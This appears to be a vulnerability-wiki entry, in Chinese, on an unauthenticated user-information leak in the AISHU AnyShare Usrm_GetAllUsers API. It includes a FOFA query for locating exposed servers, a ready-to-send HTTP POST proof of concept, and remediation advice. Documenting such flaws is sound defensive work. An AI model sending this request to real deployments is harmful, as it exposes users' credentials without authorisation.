---
source: "SourByte05/Vulnerability-Wiki-PoC"
title: "爱数AnyShare Usrm_GetAllUsers用户信息泄露"
product: "爱数AnyShare"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "版本未知；JSON数组分页协议"
prerequisites: "匿名声称"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://github.com/SourByte05/Vulnerability-Wiki-PoC"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E7%88%B1%E6%95%B0AnyShare/%E7%88%B1%E6%95%B0%20AnyShare%E6%99%BA%E8%83%BD%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0%20Usrm_GetAllUsers%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2.md"
fofa: "app=\"AISHU-AnyShare\""
id: "vw-70a2b373e5b51411476f4962"
entity_id: "ve-70a2b373e5b51411476f4962"
schema_version: "1"
---

# 爱数AnyShare Usrm_GetAllUsers用户信息泄露

## 条目说明

- 对象与具体问题：爱数AnyShare；Usrm_GetAllUsers用户信息泄露
- 版本、配置及部署条件：版本未知；JSON数组分页协议
- 认证与权限前提：匿名声称
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 没有文字返回/密码存储格式，不保证用户名密码能直接登录后台
- 100用户返回非最少证明，建议最小样本；补HTTP正文长度/类型
- 官方已修复仅产品主页无公告/build，在野已知无来源

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 漏洞描述

爱数 AnyShare智能内容管理平台 Usrm_GetAllUsers 接口存在信息泄露漏洞，未经身份认证的攻击者可获取用户名密码等敏感信息。可登录后台，使系统处于极不安全状态。

## 影响版本

AnyShare智能内容管理平台

## **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 原文提供部分细节 | 见技术资料 | 未独立核验 | 待来源核实 |

### 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

## 漏洞复现

FOFA：app="AISHU-AnyShare"

POC/EXP：

```http
POST /api/ShareMgnt/Usrm_GetAllUsers HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

[1,100]
```


![image-20241108133606017](./.resource/爱数AnyShare智能内容管理平台Usrm_GetAllUsers信息泄露/media/image-20241108133606017.png)


## 修复方案

官方已修复该漏洞，请用户联系厂商修复漏洞：https://www.aishu.cn/cn/anyshare-family

通过防火墙等安全设备设置访问策略，设置白名单访问。

如非必要，禁止公网访问该系统。


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
